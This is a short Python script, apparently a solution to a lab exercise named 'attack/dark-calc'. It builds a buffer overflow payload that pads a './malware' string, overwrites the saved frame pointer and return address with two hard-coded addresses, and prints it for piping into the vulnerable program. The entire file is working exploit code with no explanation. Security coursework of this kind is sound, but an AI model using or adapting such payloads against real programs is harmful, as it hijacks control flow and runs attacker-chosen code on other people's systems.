#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc."""
import struct
import sys


def p64(value):
    return struct.pack("<Q", value)


payload = b"./malware\x00".ljust(16, b"A")
payload += b"B" * 8
payload += p64(0x401C94)
payload += p64(0x4017E0)

sys.stdout.buffer.write(payload + b"\n")
